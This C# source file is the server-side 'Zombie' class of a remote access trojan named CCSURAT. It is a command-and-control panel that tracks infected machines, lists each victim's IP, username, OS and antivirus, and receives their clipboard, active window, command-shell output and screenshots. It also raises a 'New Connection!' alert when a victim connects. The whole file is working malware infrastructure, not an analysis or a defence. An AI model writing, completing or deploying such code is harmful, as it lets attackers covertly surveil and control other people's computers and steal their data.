using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace CCSURAT_Server
{
    public class Zombie
    {
        // Store a copy of the main form for logging
        // also store the listview to add clients to it.
        public ServerMainForm mainForm;
        private ListView zombieListView;
        private ZombieListItem zombieItem;

        // Network
        private TcpClient client;
        private NetworkStream netStream;

        #region Information
        // Details about the client or client's computer
        public string ID, IP, clientVersion, computerName, username, OS, CPU, RAM, AV, currentWindow, clipboard, CMDData, windows;
        private string status, curData;
        private Boolean active;

        // Ping checking
        private float ping;
        private Ping pingSender;
        private PingReply pingReply;
        private static string pingData = "abcdefghijklmnopqrstuvwxyzabcdef";
        private byte[] pingBuffer = Encoding.ASCII.GetBytes(pingData);
        private static int pingTimeout = 120;

        // Binary data handling variables
        private bool bufferBytes = false;
        private byte[] dataBuffer = new byte[1024 * 5000];
        private long bufferPos = 0;

        // Remote desktop
        public Image screenImage;
        public List<ControlClasses.Monitor> monitors;

        #endregion
        public Zombie(ServerMainForm form, TcpClient client)
        {
            this.mainForm = form;
            this.zombieListView = mainForm.zombieListView;
            this.client = client;
            this.netStream = client.GetStream();
            this.active = true;

            // initialize monitor list
            monitors = new List<ControlClasses.Monitor>();
            
            // initialize ping check objects
            pingSender = new Ping();

            // request basic PC info (computer name, username, cpu, etc...)
            this.SendData("[[START]][[/START]]");
            Console.Beep();
        }

        // Listen on the network stream for data coming from the client.
        public void ListenForData()
        {
            try
            {
                while (IsAlive() && IsActive())
                {
                    if (netStream.DataAvailable)
                    {
                        try {
                            byte[] bytes = new byte[1024];
                            string data = null;
                            int i;
                            if ((i = netStream.Read(bytes, 0, bytes.Length)) != 0)
                            {
                                // convert recieved bytes to string data
                                data = Encoding.ASCII.GetString(bytes, 0, i);
                                curData += data;

                                // Log data if not binary
                                if (!data.Contains("[[BINARY]]") && !bufferBytes)
                                    Log("Data recieved: " + data);

                                // If we are receiving binary data, place data into buffer.
                                // To support things such as multiple monitors being viewed at once, we need to have some sort
                                // of buffer collection.
                                if (data.Contains("[[BINARY]]"))
                                    bufferBytes = true;
                                if (bufferBytes)
                                {
                                    try
                                    {
                                        bytes.CopyTo(dataBuffer, bufferPos);
                                        bufferPos += i;
                                    }
                                    catch { }
                                }

                                // Handles the first command.
                                if (FirstCommandIsClosed(curData))
                                {
                                    HandleData(FirstCommand());
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            Log("Error reading data: " + ex.ToString());
                        }
                        Application.DoEvents();
                    }
                    // Need to test this sleep, see if it messes up communication.
                    // Using this due to high CPU usage on server.
                    Thread.Sleep(1);
                }
            }
            catch (Exception ex)
            {
                Log("Stream lost connection: " + ex.ToString());
            }
            finally
            {
                Log("Lost connection to: " + IP);
                active = false;
                // remove entry from listview if connection is lost/closed
                RemoveFromListView();
                mainForm.UpdateStatus();
            }
        }

        // checks if connection is still alive with client.
        private Boolean IsAlive()
        {
            try
            {
                // write empty buffer to client to check if connection is alive
                byte[] empty = new byte[10];
                netStream.Write(empty, 0, 0);
                //GetPing();
                //UpdatePing();
                return true;
            }
            catch (SocketException ex)
            {
                // Send buffer is full, but still connected to client.
                if (ex.NativeErrorCode.Equals(10035))
                    return true;
                else
                {
                    Log("CLIENT DEAD");
                    return false;
                }
            }
        }

        // Get the ping/latency/round trip to the client. 
        // This might need to be reworked since a firewall will block this. Maybe do this client-side?
        private void GetPing()
        {
            if (IP != string.Empty)
            {
                try
                {
                    // Ping the IP that we have 
                    pingReply = pingSender.Send(IP, pingTimeout, pingBuffer);
                    if (pingReply.Status == IPStatus.Success)
                    {
                        // total time it took for the ping to go to the client and back.
                        ping = pingReply.RoundtripTime;
                    }
                }
                catch (Exception ex)
                {
                    Log("PING ERROR: " + ex.StackTrace);
                }
            }
        }

        // Handle data received from clients.
        private void HandleData(string data)
        {
            if (IsActive())
            {
                try
                {
                    // Seperate the command and data
                    string command = GetCommand(data);
                    data = RemoveCommand(data);

                    // Handle data based on the command.
                    switch (command)
                    {
                        case "START":
                            ParseSystemInfo(data);
                            AddToListView();
                            NotifyNewConnection();
                            break;
                        case "STATUS":
                            status = data;
                            break;
                        case "ACTIVEWINDOW":
                            currentWindow = data;
                            UpdateActiveWindow();
                            break;
                        case "CLIPBOARD":
                            clipboard = data;
                            break;
                        case "CMD":
                            CMDData = data;
                            break;
                        case "BINARY":
                            HandleBinaryData(data);
                            break;
                        case "MONITORS":
                            ParseMonitorInfo(data);
                            break;
                        case "PING":
                            // If client-side pinging is implemented.
                            break;
                        case "WINDOWS":
                            windows = data;
                            break;
                    }
                }
                catch (Exception ex)
                {
                    // Data without proper command tag was received.
                    Log("Could not handle data: " + data + "\nReason: " + ex.ToString());
                }
            }
        }

        // Handle binary data (Images/Files)
        private void HandleBinaryData(string data)
        {
            // Reset binary byte buffer and position.
            bufferBytes = false; 
            bufferPos = 0;

            // remove type of data command tag from data.
            int start, length;
            if (data.Substring(0, 14) == "[[SCREENSHOT]]")
            {
                start = 14; //length of screenshot command tag
                length = data.Substring(start, data.IndexOf("[[/SCREENSHOT]]")).Length;

                string temp = Encoding.ASCII.GetString(dataBuffer, 0, 1024);

                start += 10; //length of binary command tag

                // Extract monitor device name and the |*| splitter string from the data. 
                string deviceName = temp.Split("|*|".ToCharArray(), StringSplitOptions.None)[0].Substring(start);
                Log("DEVICENAME: " + deviceName);
                start += deviceName.Length + 3; // + 3 for the |*| split string

                start += temp.IndexOf("[[BINARY]]");
                // Place extracted binary data into result
                byte[] result = new byte[length];
                for (int i = start; i < start + length; i++)
                    result[i - start] = dataBuffer[i];
                // clear data buffer
                dataBuffer = new byte[1024 * 5000];
                // Create a memory stream using result bytes
                MemoryStream memoryStream = new MemoryStream(result);
                // Grab the screen image form the memory stream
                screenImage = Image.FromStream(memoryStream);
                // Assigns screenImage to appropriate monitor
                foreach (ControlClasses.Monitor m in monitors)
                    if (m.deviceName().Equals(deviceName))
                        m.setScreenImage(screenImage);
                memoryStream.Close();
            }
        }

        // Gets command tag
        private string GetCommand(string text)
        {
            text = text.Substring(2, text.IndexOf("]") - 2);
            return text;
        }

        // Removes command tag from data
        private string RemoveCommand(string data)
        {
            data = data.Substring(data.IndexOf("]]") + 2);
            data = data.Substring(0, data.LastIndexOf("[") - 1);
            return data;
        }

        // Checks if first command in data is closed.
        private bool FirstCommandIsClosed(string data)
        {
            string openCommandTag = data.Substring(0, data.IndexOf("]") + 2);
            openCommandTag = data.Substring(2, openCommandTag.Length - 4);
            string closeCommandTag = "[[/" + openCommandTag + "]]";
            return data.Contains(closeCommandTag);
        }

        // Gets the first command's data.
        private string FirstCommand()
        {
            string openCommandTag = curData.Substring(0, curData.IndexOf("]") + 2);
            openCommandTag = curData.Substring(2, openCommandTag.Length - 4);
            string closeCommandTag = "[[/" + openCommandTag + "]]";
            string temp = curData.Substring(0, curData.IndexOf(closeCommandTag) + closeCommandTag.Length);
            curData = curData.Substring(temp.Length);
            return temp;
        }

        // write data to client
        public void SendData(string s)
        {
            try {
                // convert string data to byte array and write it to the stream
                byte[] data = Encoding.ASCII.GetBytes(s);
                netStream.Write(data, 0, data.Length);
                if (!s.Contains("[[BINARY]]") && !s.Contains("[[SCREENSHOT]]"))
                    Log("Data sent: " + s);
            } catch(Exception ex)
            {
                Log("Error sending data: " + ex.ToString());
            }
        }

        // Add to main forms listview.
        private void AddToListView()
        {
            // handle cross-thread call.
            if (zombieListView.InvokeRequired)
            {
                zombieListView.Invoke(new Action(AddToListView));
                return;
            }

            // add stored client information to listview.
            zombieItem = new ZombieListItem(this);
            zombieItem.Text = ID;
            zombieItem.SubItems.Add(IP); // subitem #1
            zombieItem.SubItems.Add(ping + " ms");
            // Will need to add a check if client version is older than server version. 
            // If that's the case, then update client or at least mark as outdated.
            zombieItem.SubItems.Add(clientVersion);
            zombieItem.SubItems.Add(computerName);
            zombieItem.SubItems.Add(username);
            zombieItem.SubItems.Add(OS);
            zombieItem.SubItems.Add(CPU);
            zombieItem.SubItems.Add(RAM);
            zombieItem.SubItems.Add(AV);
            zombieItem.SubItems.Add(currentWindow); // subitem #10

            zombieListView.Items.Add(zombieItem);
        }

        // Update the listview active window column for this client.
        private void UpdateActiveWindow()
        {
            if (zombieListView.InvokeRequired)
            {
                zombieListView.Invoke(new Action(UpdateActiveWindow));
                return;
            }
            try {
                zombieItem.SubItems[10].Text = currentWindow;
            } catch(Exception ex)
            {

            }
        }

        // Update the listview ping column for this client.
        public void UpdatePing()
        {
            if (zombieListView.InvokeRequired)
            {
                zombieListView.Invoke(new Action(UpdatePing));
                return;
            }
            try
            {
                GetPing();
                zombieItem.SubItems[2].Text = ping + " ms";
            }
            catch (Exception ex)
            {

            }
        }

        // Removes client from the list of active clients and sets the listview
        // item to gray color.
        private void RemoveFromListView()
        {
            if (zombieListView.InvokeRequired)
            {
                zombieListView.Invoke(new Action(RemoveFromListView));
                return;
            }
            //zombieListView.Items.Remove(this.zombieItem);
            mainForm.zombies.Remove(this);
            zombieItem.ForeColor = Color.Gray;
        }

        // Parse the data and set the client's system info
        private void ParseSystemInfo(string data)
        {
            // The IP is taken serverside by using the first part of RemoteEndPoint
            // which is the endpoint of the socket connection.
            try {
                EndPoint temp = client.Client.RemoteEndPoint;
                IP = temp.ToString().Substring(0, temp.ToString().IndexOf(":"));
            }catch(Exception)
            {
                IP = "Unknown";
            }

            // The rest of the information is what was sent by the client.
            // Each piece of system info is seperated by: |*|
            string[] info = data.Split("|*|".ToCharArray(), StringSplitOptions.RemoveEmptyEntries);
            ID = info[0];
            clientVersion = info[1];
            computerName = info[2];
            username = info[3];
            OS = info[4];
            CPU = info[5];
            RAM = info[6];
            AV = info[7];
            currentWindow = info[8];
        }

        // Parses list of monitors returned by the client.
        public void ParseMonitorInfo(string data)
        {
            try {
                // Each monitor's details is seperated by |&|
                string[] allMonitors = data.Split(new string[] { "|&|" }, StringSplitOptions.RemoveEmptyEntries);
                foreach (string monitor in allMonitors)
                {
                    // And each piece of info about the monitor is seperated by |*|
                    string[] info = monitor.Split("|*|".ToCharArray(), StringSplitOptions.RemoveEmptyEntries);
                    // Add a new Monitor object into the list of monitors.
                    monitors.Add(new ControlClasses.Monitor(info[0].Equals("true") ? true : false, // If the monitor is the primary monitor.
                                                            Convert.ToInt32(info[1]), Convert.ToInt32(info[2]), // Bounds: X, Y
                                                             Convert.ToInt32(info[3]), Convert.ToInt32(info[4]), // Bounds: Width, Height 
                                                                                                        info[5])); // Monitor's device name
                }
            }catch(Exception ex)
            {
                Log("MONITOR PARSE ERROR: " + ex.ToString());
            }
        }

        // Create notification popup to notify of new connection.
        private void NotifyNewConnection()
        {
            mainForm.taskbarIcon.BalloonTipTitle = "New Connection!";
            mainForm.taskbarIcon.BalloonTipText = "IP: " + IP + "\nComputer: " + computerName + "\nUser: " + username;
            mainForm.taskbarIcon.ShowBalloonTip(3000);
        }
        public Boolean IsActive()
        {
            return active;
        }

        // Print to main form's console.
        private void Log(string s)
        {
            mainForm.Log(s);
        }
    }
}
